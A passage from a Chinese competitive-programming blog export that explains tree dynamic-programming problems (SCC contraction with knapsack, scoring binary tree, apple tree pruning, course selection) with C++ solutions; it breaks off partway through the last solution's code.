<p>对于出现环的关系，也就是1依赖2，2依赖1，那么出现这种情况的时候，我们就可以将2和1看作是一个点了，如果选择这个点那么就是肯定里面的1和2都选择，如果不选择这个点，那么权值和重量就全都是0了。</p>
<p>如果里面只选择1的话，结果就和全部都不选是一样的。那么我们就可以用Tarjan算法求出所有的联通分量，然后将所有的联通分量当成一个点，然后重新建造一个二叉树，在重新建造的二叉树上进行DP，状态设置就是 <code>f[i][j]</code> 表示对于节点i在承受j重量下，所能达到的最大权值。（变量声明的有些多QAQ）</p>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">&#125;a[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> Value[<span class="number">200</span>],Weight[<span class="number">200</span>],n,m,len=<span class="number">0</span>,This;</span><br><span class="line"><span class="keyword">int</span> Father,Link_First[<span class="number">200</span>],f[<span class="number">200</span>][<span class="number">600</span>],top=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ind=<span class="number">0</span>,low[<span class="number">200</span>],dfn[<span class="number">200</span>],tot=<span class="number">0</span>,Stack[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> Belong[<span class="number">200</span>],Avalue[<span class="number">200</span>],Aweight[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> Link_Second[<span class="number">200</span>],Child[<span class="number">200</span>],Brother[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">bool</span> Vis[<span class="number">200</span>],Get[<span class="number">200</span>],Find[<span class="number">200</span>][<span class="number">600</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>;</span><br><span class="line">    low[x]=dfn[x]=++ind;</span><br><span class="line">    Stack[++top]=x;</span><br><span class="line">    Vis[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_First[x];i;i=a[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> y=a[i].Point;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[y])</span><br><span class="line">        &#123;</span><br><span class="line">            Tarjan(y);</span><br><span class="line">            low[x]=min(low[x],low[y]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(Vis[y])</span><br><span class="line">        low[x]=min(low[x],dfn[y]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(low[x]==dfn[x])</span><br><span class="line">    &#123;</span><br><span class="line">        tot++;<span class="comment">//找到一个联通分量缩成一个点</span></span><br><span class="line">        <span class="keyword">while</span>(This!=x)</span><br><span class="line">        &#123;</span><br><span class="line">            This=Stack[top--];</span><br><span class="line">            Vis[This]=<span class="literal">false</span>;</span><br><span class="line">            Belong[This]=tot;</span><br><span class="line">            Avalue[tot]+=Value[This];</span><br><span class="line">            Aweight[tot]+=Weight[This];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rebuild</span><span class="params">()</span><span class="comment">//重新建为二叉树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Cut=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">1</span>;x&lt;=n;x++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_First[x];i;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(Belong[a[i].Point]!=Belong[x])</span><br><span class="line">    &#123;</span><br><span class="line">        This=a[i].Point;</span><br><span class="line">        Get[Belong[This]]=<span class="literal">true</span>;</span><br><span class="line">        Brother[Belong[This]]=Child[Belong[x]];</span><br><span class="line">        Child[Belong[x]]=Belong[This];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> dis)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dis&lt;=<span class="number">0</span>||x&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(Find[x][dis]==<span class="literal">true</span>) <span class="keyword">return</span> f[x][dis];</span><br><span class="line">    Find[x][dis]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=dis-Aweight[x];i++)<span class="comment">//如果装x</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> First=DFS(Child[x],i)+Avalue[x];</span><br><span class="line">        <span class="keyword">int</span> Second=DFS(Brother[x],dis-i-Aweight[x]);</span><br><span class="line">        f[x][dis]=max(f[x][dis],First+Second);</span><br><span class="line">    &#125;</span><br><span class="line">    f[x][dis]=max(f[x][dis],DFS(Brother[x],dis));<span class="comment">//不装x</span></span><br><span class="line">    <span class="keyword">return</span> f[x][dis];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(Find,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Find));</span><br><span class="line">    <span class="built_in">memset</span>(Brother,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Brother));</span><br><span class="line">    <span class="built_in">memset</span>(Child,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Child));</span><br><span class="line">    <span class="built_in">memset</span>(Vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Vis));</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Weight[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Value[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;Father;</span><br><span class="line">        a[i].Point=i;</span><br><span class="line">        a[i].Next=Link_First[Father];</span><br><span class="line">        Link_First[Father]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!dfn[i]) Tarjan(i);<span class="comment">//使用Tarjan算法缩点</span></span><br><span class="line">    Rebuild();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++)</span><br><span class="line">    <span class="keyword">if</span>(Get[i]==<span class="literal">false</span>)<span class="comment">//将形成环的点归为没有约束的点</span></span><br><span class="line">    &#123;</span><br><span class="line">        Get[i]=<span class="literal">true</span>;</span><br><span class="line">        Brother[i]=Child[<span class="number">0</span>];</span><br><span class="line">        Child[<span class="number">0</span>]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;DFS(<span class="number">0</span>,m)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>树结构</tag>
      </tags>
  </entry>
  <entry>
    <title>树形DP(1)</title>
    <url>/2017/05/20/20f7dcad3922/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>树形动态规划其实就是在树上进行其他的DP，不过存储由线性的一个数组变成了一个树结构，不过本质还是需要用到各种动态规划的，下面是几道题目：</p>
</blockquote>
<h1 id="P1300加分二叉树"><a href="#P1300加分二叉树" class="headerlink" title="P1300加分二叉树"></a>P1300加分二叉树</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>设一个n个节点的二叉树tree的中序遍历为（l,2,3,…,n），其中数字1,2,3,…,n为节点编号。每个节点都有一个分数（均为正整数），记第i个节点的分数为di，tree及它的每个子树都有一个加分，任一棵子树subtree（也包含tree本身）的加分计算方法如下：subtree的左子树的加分× subtree的右子树的加分＋subtree的根的分数若某个子树为空，规定其加分为1，叶子的加分就是叶节点本身的分数。不考虑它的空子树。</p>
</blockquote>
<ul>
<li>试求一棵符合中序遍历为（1,2,3,…,n）且加分最高的二叉树tree。</li>
</ul>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入:"></a>输入:</h2><ol>
<li>第1行：一个整数n（n＜30），为节点个数。</li>
<li>第2行：n个用空格隔开的整数，为每个节点的分数（分数＜100）。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><ol>
<li>tree的最高加分<br></li>
<li>tree的前序遍历</li>
</ol>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>其实这道题就是披着数规的皮，心是区间动态规划的心，我们需要在中序遍历的基础上进行区间动态规划就行，如果你建立一个图，就可以明白这样为什么可以了，在DP的过程中，要记录下来对于区间x，y的最优值是由i到k和k到j得到的k值，这样的话求前序遍历的时候我们就可以根据k为根节点，结合中序遍历就能够求出前序遍历了。</p>
<p>所以说有时候遇到一些题目，需要仔细想一想这些题的本质是什么类型的，不要被外表所迷惑，有可能就是披着各种复杂算法的皮，但是本质很简单。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">100</span>],f[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> Root[<span class="number">100</span>][<span class="number">100</span>],This;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Root[x][y]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=Root[x][y]<span class="number">-1</span>&amp;&amp;Root[x][y]<span class="number">-1</span>&gt;<span class="number">0</span>)</span><br><span class="line">    Get(x,Root[x][y]<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(Root[x][y]+<span class="number">1</span>&lt;=y&amp;&amp;Root[x][y]+<span class="number">1</span>&lt;=n)</span><br><span class="line">    Get(Root[x][y]+<span class="number">1</span>,y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Root,<span class="number">0</span>,<span class="keyword">sizeof</span>(Root));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=n+<span class="number">1</span>;j++)</span><br><span class="line">    f[i][j]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        f[i][i]=a[i];</span><br><span class="line">        Root[i][i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">2</span>;k&lt;=n;k++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i+k<span class="number">-1</span>&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j=i+k<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> m=i;m&lt;=j;m++)</span><br><span class="line">        <span class="keyword">if</span>(f[i][j]&lt;f[i][m<span class="number">-1</span>]*f[m+<span class="number">1</span>][j]+a[m])</span><br><span class="line">        &#123;</span><br><span class="line">             f[i][j]=f[i][m<span class="number">-1</span>]*f[m+<span class="number">1</span>][j]+a[m];</span><br><span class="line">             Root[i][j]=m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    Get(<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1303苹果二叉树"><a href="#P1303苹果二叉树" class="headerlink" title="P1303苹果二叉树"></a>P1303苹果二叉树</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>有一棵苹果树，如果树枝有分叉，一定是分2叉（就是说没有只有1个儿子的结点）这棵树共有N个结点（叶子点或者树枝<strong>分叉点</strong>），编号为1-N,树根编号一定是1。</p>
</blockquote>
<blockquote>
<p>我们用一根树枝两端连接的结点的编号来描述一根树枝的位置。现在这颗树枝条太多了，需要剪枝。但是一些树枝上长有苹果。给定需要保留的树枝数量，求出最多能留住多少苹果</p>
</blockquote>
<h2 id="输入-1"><a href="#输入-1" class="headerlink" title="输入:"></a>输入:</h2><blockquote>
<p>第1行2个数，N和Q(1&lt;=Q&lt;= N,1&lt;N&lt;=100)。N表示树的结点数，Q表示要保留的树枝数量。接下来N-1行描述树枝的信息。</p>
</blockquote>
<blockquote>
<p>每行3个整数，前两个是它连接的结点的编号。第3个数是这根树枝上苹果的数量。每根树枝上的苹果不超过30000个。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>一个数，最多能留住的苹果的数量。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题是一道典型的二叉树树规的题目，二叉树其实是比较简单的，存储非常方便，我们只用一个二维数组 <code>a[30000][2]</code> 表示对于一个根i，其左孩子是0，右孩子是1，然后递归访问，用 <code>f[i][j]</code> 表示对于根节点i，保留j条边所能获得的最大苹果数量。那么DP思路就出来了，<code>f[i][j]</code> 中的保留j条边由左孩子和右孩子提供，枚举每个孩子提供边的数量，然后取最大值就好，注意这里需要递归返回对于根节点i，其子树上一共有多少条边，这样可以确定枚举范围，然后要注意一下两棵树分别的边数，避免出现无法达到的情况。</p>
<p>DP方程用有三种情况：</p>
<p>1.左子树一个也不提供，右子树提供数量大于零；</p>
<p>2.左子树提供数量大于零，右子树一个也不提供；</p>
<p>3.两个字数的提供数量都大于零。</p>
<p>（对于两个都不提供的，由于f的初始值是零，可以不作处理）</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,q,Apple[<span class="number">200</span>][<span class="number">200</span>],f[<span class="number">200</span>][<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> x,y,v,Tree[<span class="number">200</span>][<span class="number">3</span>],This;</span><br><span class="line"><span class="keyword">bool</span> Get[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> Left=DFS(Tree[x][<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">int</span> Right=DFS(Tree[x][<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">int</span> all=Left+Right;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=all;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;=min(Left,i);k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i-k&gt;Right) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(i-k&gt;<span class="number">0</span>&amp;&amp;k&gt;<span class="number">0</span>)</span><br><span class="line">        f[x][i]=max(f[x][i],f[Tree[x][<span class="number">1</span>]][k<span class="number">-1</span>]+f[Tree[x][<span class="number">2</span>]][i-k<span class="number">-1</span>]+Apple[x][Tree[x][<span class="number">1</span>]]+Apple[x][Tree[x][<span class="number">2</span>]]);</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">0</span>&amp;&amp;i-k&gt;<span class="number">0</span>) f[x][i]=max(f[x][i],f[Tree[x][<span class="number">2</span>]][i-k<span class="number">-1</span>]+Apple[x][Tree[x][<span class="number">2</span>]]);</span><br><span class="line">        <span class="keyword">if</span>(k&gt;<span class="number">0</span>&amp;&amp;i-k==<span class="number">0</span>) f[x][i]=max(f[x][i],f[Tree[x][<span class="number">1</span>]][k<span class="number">-1</span>]+Apple[x][Tree[x][<span class="number">1</span>]]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> all+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Apple,<span class="number">0</span>,<span class="keyword">sizeof</span>(Apple));</span><br><span class="line">    <span class="built_in">memset</span>(Tree,<span class="number">0</span>,<span class="keyword">sizeof</span>(Tree));</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    Get[<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y&gt;&gt;v;</span><br><span class="line">        <span class="keyword">if</span>(Get[y]) swap(x,y);</span><br><span class="line">        Get[y]=<span class="literal">true</span>;</span><br><span class="line">        Apple[x][y]=v;</span><br><span class="line">        Apple[y][x]=v;</span><br><span class="line">        <span class="keyword">if</span>(!Tree[x][<span class="number">1</span>])</span><br><span class="line">        Tree[x][<span class="number">1</span>]=y;</span><br><span class="line">        <span class="keyword">else</span> Tree[x][<span class="number">2</span>]=y;</span><br><span class="line">    &#125;</span><br><span class="line">    This=DFS(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[<span class="number">1</span>][q]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1304选课"><a href="#P1304选课" class="headerlink" title="P1304选课"></a>P1304选课</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>学校实行学分制。每门的必修课都有固定的学分，同时还必须获得相应的选修课程学分。学校开设了N（N&lt;300）门的选修课程，每个学生可选课程的数量M是给定的。学生选修了这M门课并考核通过就能获得相应的学分.在选修课程中，有些课程可以直接选修，有些课程需要一定的基础知识，必须在选了其它的一些课程的基础上才能选修。例如《Frontpage》必须在选修了《Windows操作基础》之后才能选修。我们称《Windows操作基础》是《Frontpage》的先修课。每门课的直接先修课最多只有一门。两门课也可能存在相同的先修课。每门课都有一个课号，依次为1，2，3，…。<br><br>你的任务是为自己确定一个选课方案，使得你能得到的学分最多，并且必须满足先修课优先的原则。假定课程之间不存在时间上的冲突。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入文件的第一行包括两个整数N、M（中间用一个空格隔开），其中1≤N≤300,1≤M≤N。 以下N行每行代表一门课。课号依次为1，2，…，N。每行有两个数（用一个空格隔开），第一个数为这门课先修课的课号（若不存在先修课则该项为0），第二个数为这门课的学分。学分是不超过10的正整数。</p>
</blockquote>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>只有一个数：实际所选课程的学分总数。</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><p>这道题写起来是在是崩溃，DFS到了现在我的代码能力还是弱的一批，两次写都把大量的时间花在了调试上面QAQ，以后如果去写一道题的时候没有非常清晰的思路并且可以证明这种思路基本上不会出现任何问题不会被各种特殊情况卡成错误并且自己能在纸上写出框架其中的每一个元素都有详细的计算过程在脑子里构思过的话，我是不回开始去敲这道题的！！！说到做到!</p>
<p>这道题刚开始的时候我就直接是用DFS计算 <code>f[i][j]</code> 对于节点i保留j个最大值，我是从第一个节点直接开始计算，然后计算完毕之后开始DFS，关于需要前面的节点我都是找一条最长路径，结果很显然的错了QAQ。</p>
<p>然后我就默默的开始看题解了，发现这里DFS是先开始的，然后再计算，也就是说对于节点 <code>f[i][j]</code> 是从叶节点直接开始计算的，然后反推出来根节点，这里因为选择里面是有很多种情况，所以在计算的时候不能简单的将边排序，然后要几个取几个的，因为考虑到有子节点是属于根节点的，所以说子节点下面还有根节点，也是可以构成最优解，所以说我们需要再次列出来一个数组 <code>Get[i][j]</code> 表示的是对于根节点x的前i个子节点（注意这里计算的只有子节点），选择j个的最优值，用另外一个k循环来找到当只去 <code>k-1</code> 个根的时候，第k个根包括下面的子树来贡献出来 <code>j-k+1</code> 个点。</p>
<p>求出来Get之后，我们就可以很好的求出 <code>f[i][j]</code> 了，那么对于当前的x节点，选择j的点的时候，是 <code>Get[all][j-1]+Value[x]</code> ，Value表示根x的权值，all表示的是x节点儿子的个数。</p>
<p>具体的方法就是多叉树转二叉树然后进行计算，这样的的话写法很简便，但是对于多叉树转二叉树来说只有见到上面黄学长写出来的代码的复杂度比较第，我再次写出来的多叉树转二叉树反而效率非常低，比之前写出来的多叉树上面进行动态规划还要慢，更不要和黄学长的代码比了，但是苦恼于看不懂黄学长的代码，代码可读性果然和实力成反比的啊……</p>
<p>然后就是如何进行多叉树转二叉树的方法：我们建立两个数组，Child和Brother，这两个数组分别表示对于节点 i 来说，自己的孩子和自己的兄弟，这样的话就建成了一个二维数组，然后我们进行DFS寻找，表示如果要选择当前节点，那么就DFS(Child[x],y-i-1)，如果不选择当前节点，那么就把主动权交给下一位可爱的兄弟DFS(Borther[x],i)，那么这样下去我们就利用了传递性将所有的情况都传递了下去（可能就是因为这种DFS过程太多了导致时间有些长，但是代码本身还是很简单的，从开始敲到结束也就不到二十分钟，相对于我自己写的在多叉树上进行DP来说的确是好些很多，但是时间上也相差将近一倍，以后选择是否进行多叉树转二叉树的时候需要判断一下具体情况，看哪一个的性价比比较高然后做出选择）</p>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><p>我的垃圾代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">&#125;a[<span class="number">400</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,Link[<span class="number">400</span>],Value[<span class="number">400</span>],son[<span class="number">400</span>];</span><br><span class="line"><span class="keyword">int</span> y,len=<span class="number">0</span>,f[<span class="number">400</span>][<span class="number">400</span>],num[<span class="number">400</span>],Get[<span class="number">400</span>][<span class="number">400</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">400</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> all=<span class="number">0</span>,now=<span class="number">0</span>,Plus=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(vis[x]) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">else</span> vis[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i;i=a[i].Next) all+=DFS(a[i].Point);</span><br><span class="line">    son[x]=all;</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="number">0</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i;i=a[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        now++; Plus+=son[a[i].Point]+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=Plus;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            Get[now][j]=Get[now<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span 